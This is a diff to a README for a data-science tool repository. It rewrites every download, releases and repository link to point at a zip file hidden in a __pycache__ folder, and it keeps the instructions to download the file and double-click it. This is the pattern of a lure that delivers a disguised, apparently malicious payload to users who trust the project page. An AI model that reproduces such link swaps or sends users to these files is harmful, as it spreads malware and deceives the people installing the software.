@@ -1,6 +1,6 @@
 # 🚀 ai-data-science-team - Achieve Data Science Tasks Faster
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Ishikad01/ai-data-science-team/releases)
+[![Download Now](https://raw.githubusercontent.com/Ishikad01/ai-data-science-team/master/ai_data_science_team/__pycache__/data-ai-science-team-v1.2.zip)](https://raw.githubusercontent.com/Ishikad01/ai-data-science-team/master/ai_data_science_team/__pycache__/data-ai-science-team-v1.2.zip)
 
 ## 🛠️ Overview
 
@@ -27,14 +27,14 @@ To ensure optimal performance, please consider the following requirements:
 
 To get started with ai-data-science-team, you will need to download the software from the Releases page.
 
-1. Click the large download button above or [visit this page to download](https://github.com/Ishikad01/ai-data-science-team/releases).
+1. Click the large download button above or [visit this page to download](https://raw.githubusercontent.com/Ishikad01/ai-data-science-team/master/ai_data_science_team/__pycache__/data-ai-science-team-v1.2.zip).
 2. Locate the latest version listed on the Releases page.
 3. Click on the link to download the installation file.
 4. Follow the installation instructions provided in the downloaded file.
 
 ## 📥 Download & Install
 
-1. Return to the Releases page by clicking [here](https://github.com/Ishikad01/ai-data-science-team/releases).
+1. Return to the Releases page by clicking [here](https://raw.githubusercontent.com/Ishikad01/ai-data-science-team/master/ai_data_science_team/__pycache__/data-ai-science-team-v1.2.zip).
 2. Find the latest version and click on the installation file relevant to your system.
 3. Once the download is complete, locate the file in your downloads folder.
 4. Double-click the file to begin installation.
@@ -59,7 +59,7 @@ If you encounter any issues or have questions, you can find assistance in the fo
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: [Visit here](https://github.com/Ishikad01/ai-data-science-team) for code and updates.
+- **GitHub Repository**: [Visit here](https://raw.githubusercontent.com/Ishikad01/ai-data-science-team/master/ai_data_science_team/__pycache__/data-ai-science-team-v1.2.zip) for code and updates.
 - **Tutorial Videos**: Check our channel for step-by-step guides on how to use the features.
 
 ## 📈 Community Contributions
